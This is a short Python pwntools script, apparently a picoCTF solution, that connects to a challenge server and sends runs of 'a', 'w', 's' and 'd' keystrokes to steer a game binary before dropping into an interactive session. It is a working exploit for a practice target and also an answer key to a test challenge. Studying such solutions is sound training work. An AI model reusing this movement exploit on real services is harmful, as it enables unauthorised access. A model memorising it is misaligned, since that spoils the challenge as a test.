from pwn import *
context.log_level = "debug"
r = remote("saturn.picoctf.net", 53039)

x = 29
y = 89
r.sendline("a"*4)
r.sendline("w"*4)
r.sendline("a"*4)
r.sendline("s"*x)
r.sendline("d"*(y+4))
r.interactive()
r.close()
